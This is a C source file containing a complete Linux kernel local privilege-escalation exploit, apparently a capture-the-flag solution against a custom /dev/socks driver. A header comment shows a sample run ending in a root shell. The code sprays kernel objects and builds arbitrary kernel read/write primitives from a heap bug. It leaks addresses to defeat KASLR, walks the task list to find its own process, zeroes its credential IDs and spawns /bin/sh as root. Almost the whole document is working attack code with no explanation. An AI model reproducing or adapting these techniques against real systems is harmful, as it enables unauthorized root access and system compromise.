/*
~ $ ./exploit 
[*] Spraying 256 socks_t structs
[*] Mmaped pages:
        - 0x7f8262612000
        - 0x7f8262613000
[+] Leaked heap addr at 0xffff888002ec3720
[+] Sentinel 0x4141414141414141 found at 0xffff888002ec37a8
[+] shmem_vm_ops leaked at 0xffffffff81c16b80
[*] Kernel base address at 0xffffffff81000000
[*] init_task at 0xffffffff8200f740
[*] Searching for current_task
        - 0xffff8880034a0000 -> sh
        - 0xffff8880034a0b40 -> kthreadd
        - 0xffff8880034a1680 -> rcu_gp
        - 0xffff8880034a21c0 -> rcu_par_gp
        - 0xffff8880034a2d00 -> kworker/0:0
        - 0xffff8880034a3840 -> kworker/0:0H
        - 0xffff8880034a4380 -> kworker/u2:0
        - 0xffff8880034a4ec0 -> mm_percpu_wq
        - 0xffff8880034a5a00 -> ksoftirqd/0
        - 0xffff8880034a6540 -> rcu_sched
        - 0xffff8880034a7080 -> rcu_bh
        - 0xffff8880034e0000 -> migration/0
        - 0xffff8880034e0b40 -> cpuhp/0
        - 0xffff8880034e1680 -> kdevtmpfs
        - 0xffff8880034e21c0 -> netns
        - 0xffff8880034e2d00 -> kworker/u2:1
        - 0xffff8880034e4380 -> kworker/0:1
        - 0xffff8880034e3840 -> kauditd
        - 0xffff8880034e5a00 -> oom_reaper
        - 0xffff8880034e6540 -> writeback
        - 0xffff8880034e4ec0 -> kcompactd0
        - 0xffff88800355da00 -> crypto
        - 0xffff88800355b840 -> kblockd
        - 0xffff88800355e540 -> ata_sff
        - 0xffff8880035b6540 -> md
        - 0xffff8880035b4ec0 -> edac-poller
        - 0xffff8880035b0b40 -> kswapd0
        - 0xffff8880035b7080 -> acpi_thermal_pm
        - 0xffff88800355ad00 -> scsi_eh_0
        - 0xffff88800355cec0 -> scsi_tmf_0
        - 0xffff88800355a1c0 -> scsi_eh_1
        - 0xffff888003558000 -> scsi_tmf_1
        - 0xffff8880035b0000 -> kworker/u2:2
        - 0xffff8880035b2d00 -> kworker/u2:3
        - 0xffff888002df9680 -> kworker/u2:4
        - 0xffff888002df8b40 -> kworker/0:1H
        - 0xffff888002dfc380 -> kworker/0:2
        - 0xffff888002e90000 -> exp1337
[+] current_task found at 0xffff888002e90000
[*] cred at 0xffff888002e50500
[+] Got root!
/bin/sh: can't access tty; job control turned off
/home/user # id
uid=0(root) gid=0(root) groups=1000(user)
*/

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/prctl.h>

#define N_ELEMS(x) (sizeof x / sizeof x[0])

#define SOCKS_INIT		0xC0087301
#define SOCKS_LISTEN 	0xC0407302
#define SOCKS_CONNECT	0xC0407303
#define SOCKS_SEND		0xC0107304
#define SOCKS_RECV 		0xC0107305

#define N 2 /* number of pages for heap spraying */

#define SHMEM_VM_OPS    0xC16B80
#define INIT_TASK       0x100F740
#define CRED            0x560
#define COMM            0x570       
#define TASKS           0x2C8 /* tasks.next; */

char* ptr;

int fds[N * 128];

struct socks_info {
	uint64_t size;
	char* buf;
};

/*
    struct socks {
        _BYTE lock;
        _QWORD* next;
        _QWORD* prev;
        char name[64];
        int state;
        struct socks* peer;
        struct socket_t* socket;
    };

    struct socket_t {
        _QWORD max_size;
        char* buf;
        _QWORD hi;
        _QWORD lo;
    };
*/

int ioctl(int fd, unsigned long cmd, unsigned long arg) {
    return syscall(SYS_ioctl, fd, cmd, arg);
}

void init_socks(int fd, unsigned long max_size) {
    ioctl(fd, SOCKS_INIT, max_size);
}

void listen_socks(int fd, char* name) {
    ioctl(fd, SOCKS_LISTEN, (unsigned long) name);
}

void connect_socks(int fd, char* name) {
    ioctl(fd, SOCKS_CONNECT, (unsigned long) name);	
}

void send_socks(int fd, char* buf, uint64_t size) {
    struct socks_info s = { .size = size, .buf = buf };
    ioctl(fd, SOCKS_SEND, (unsigned long) &s);
}

void recv_socks(int fd, char* buf, uint64_t size) {
    struct socks_info s = { .size = size, .buf = buf };
    ioctl(fd, SOCKS_RECV, (unsigned long) &s);
}

uint64_t read64(uint64_t addr) {
    *((uint64_t *) (ptr + 0xFE0)) = 8;
    *((uint64_t *) (ptr + 0xFE8)) = addr;
    *((uint64_t *) (ptr + 0xFF0)) = 0;
    *((uint64_t *) (ptr + 0xFF8)) = 8;

    uint64_t data;
    send_socks(fds[N_ELEMS(fds) - 4], ptr + 0xFE0, 0x21);
    recv_socks(fds[N_ELEMS(fds) - 2], (char *) &data, 8);

    return data;
}

uint32_t read32(uint64_t addr) {
    *((uint64_t *) (ptr + 0xFE0)) = 4;
    *((uint64_t *) (ptr + 0xFE8)) = addr;
    *((uint64_t *) (ptr + 0xFF0)) = 0;
    *((uint64_t *) (ptr + 0xFF8)) = 4;

    uint32_t data;
    send_socks(fds[N_ELEMS(fds) - 4], ptr + 0xFE0, 0x21);
    recv_socks(fds[N_ELEMS(fds) - 2], (char *) &data, 4);

    return data;
}

uint64_t write64(uint64_t addr, uint64_t value) {
    *((uint64_t *) (ptr + 0xFE0)) = 8;
    *((uint64_t *) (ptr + 0xFE8)) = addr;
    *((uint64_t *) (ptr + 0xFF0)) = 8;
    *((uint64_t *) (ptr + 0xFF8)) = 0;

    uint64_t data = value;
    send_socks(fds[N_ELEMS(fds) - 4], ptr + 0xFE0, 0x21);
    send_socks(fds[N_ELEMS(fds) - 1], (char *) &data, 8);

    return data;
}

uint32_t write32(uint64_t addr, uint32_t value) {
    *((uint64_t *) (ptr + 0xFE0)) = 4;
    *((uint64_t *) (ptr + 0xFE8)) = addr;
    *((uint64_t *) (ptr + 0xFF0)) = 4;
    *((uint64_t *) (ptr + 0xFF8)) = 0;

    uint32_t data = value;
    send_socks(fds[N_ELEMS(fds) - 4], ptr + 0xFE0, 0x21);
    send_socks(fds[N_ELEMS(fds) - 1], (char *) &data, 4);

    return data;
}

uint64_t leak(void) {
    *((uint64_t *) (ptr + 0xFF8)) = 0x10;

    char buf[0x10] = { [0 ... 0xF] = 'A' };
    send_socks(fds[N_ELEMS(fds) - 1], buf, sizeof(buf));

    uint64_t data;
    send_socks(fds[N_ELEMS(fds) - 4], ptr + 0xFF8, 9);
    recv_socks(fds[N_ELEMS(fds) - 2], buf, sizeof(buf));

    data = *((uint64_t *) (buf + 8));

    return data;
}

uint64_t search64(uint64_t start, uint64_t value) {    
    while (read64(start) != value)
        start += 8;    
    return start;
}

uint64_t search_offset(uint64_t start, uint16_t offset) {
    while ((uint16_t) (read64(start) & 0xFFF) != offset)
        start -= 8;
    return read64(start);
}

uint64_t search_task(uint64_t init_task) {
    char comm[16]; /* TASK_COMM_LEN 16 */
    
    printf("[*] Searching for current_task\n");

    /* change current_task comm */
    char* name = "exp1337";
    prctl(PR_SET_NAME, name, 0, 0, 0);
    
    uint64_t current_task = init_task;
    uint64_t next_task = 0;

    /* explore tasks doubly linked list */
    while (next_task != init_task) {
        next_task = read64(current_task + TASKS) - TASKS;
        
        *(uint64_t *) comm = read64(next_task + COMM);
        *(uint64_t *) (comm + 8) = read64(next_task + COMM + 8);
     
        printf("\t- %#lx -> %s\n", next_task, comm);
        if (strcmp(comm, name) == 0)
            break;

        current_task = next_task;
    }
    
    return next_task;
}

int main(int argc, char* argv[argc+1]) {
    int shm_id;

    /* create shared memory segment */
    shm_id = shmget(IPC_PRIVATE, 0x400, IPC_CREAT | 0666);
    if (shm_id == -1)
        perror("shmget()");

    printf("[*] Spraying %ld socks_t structs\n", N_ELEMS(fds));

    /* spray N-memory pages of socks_t struct */
    for (size_t i = 0; i < N_ELEMS(fds); ++i) {
        fds[i] = open("/dev/socks", O_RDWR);
        if (fds[i] == -1)
            perror("open()");

        init_socks(fds[i], ULONG_MAX);
    }

    listen_socks(fds[N_ELEMS(fds)  - 4], "socks");
    connect_socks(fds[N_ELEMS(fds) - 3], "socks");

    listen_socks(fds[N_ELEMS(fds)  - 2], "socks2");
    connect_socks(fds[N_ELEMS(fds) - 1], "socks2");

    ptr = mmap((void *) 0, 0x2000, PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    /* prepare second page for page faulting when accessing it */
    if (mprotect((void *) ptr + 0x1000, 0x1000, PROT_NONE) == -1)
        perror("mprotect()");

    printf("[*] Mmaped pages:\n\t- %p\n\t- %p\n", ptr, ptr + 0x1000);

    uint64_t heap_addr;

    heap_addr = leak();
    printf("[+] Leaked heap addr at %#lx\n", heap_addr);
        
    uint64_t sentinel = 0x4141414141414141;
    uint64_t sentinel_addr = search64(heap_addr, sentinel);

    if (read64(sentinel_addr) == sentinel) {
        printf("[+] Sentinel %#lx found at %#lx\n", sentinel, sentinel_addr);
    } else {
        printf("[-] Couldn't find sentinel\n");
        return EXIT_FAILURE;
    }

    /* kfree() a nearby slot for allocation */
    close(fds[N_ELEMS(fds) - 5]);
    
    /* attach to shared memory segment */
    char* str = shmat(shm_id, (void *) 0, 0);        
    
    uint64_t shmem_vm_ops;

    uint16_t shmem_vm_ops_offset = 0xB80;
    uint16_t shmem_fault_offset  = 0xA0;

    /* leak shm_file_data allocated struct fields */
    shmem_vm_ops = search_offset(sentinel_addr, shmem_vm_ops_offset);
    if ((read64(shmem_vm_ops + 0x20) & 0xFFF) == shmem_fault_offset) {
        printf("[+] shmem_vm_ops leaked at %#lx\n", shmem_vm_ops);
    } else {
        printf("[-] Couldn't leak shmem_vm_ops\n");
        return EXIT_FAILURE;
    }
    
    uint64_t kernel_base = shmem_vm_ops - SHMEM_VM_OPS;
    uint64_t init_task = kernel_base + INIT_TASK;
    
    printf("[*] Kernel base address at %#lx\n", kernel_base);
    printf("[*] init_task at %#lx\n", init_task);    
    
    uint64_t current_task;

    current_task = search_task(init_task);   
    printf("[+] current_task found at %#lx\n", current_task);
    
    uint64_t cred = read64(current_task + CRED);
    printf("[*] cred at %#lx\n", cred);
 
    uint64_t* cred_ptr = (uint64_t *) (cred + 4);
    for (uint64_t* p = cred_ptr; p < cred_ptr + 4; ++p) {
        write64((uint64_t) p, 0);
        if (read64((uint64_t) p) != 0) {
            printf("[-] couldn't get root\n");
            return EXIT_FAILURE;
        }
    }

    printf("[+] Got root!\n");

    char* args[] = { "/bin/sh", 0 };
    execve(args[0], args, 0);

	return EXIT_SUCCESS;
}
